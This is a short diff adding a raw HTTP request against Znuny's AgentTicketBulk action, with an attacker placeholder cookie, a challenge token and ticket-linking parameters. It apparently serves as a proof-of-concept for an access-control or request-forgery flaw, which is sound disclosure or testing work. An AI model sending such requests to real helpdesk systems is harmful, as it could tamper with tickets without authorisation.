@@ -1,0 +1,4 @@
+POST /znuny/index.pl HTTP/1.1
+Cookie: OTRSAgentInterface=<attacker>
+
+Action=AgentTicketBulk&Subaction=Do&ChallengeToken=yi5YoE8OyfJRKVzrorhDGtUxwgBLtKiQ&TicketID=68&LinkTogetherParent=2026092910000685
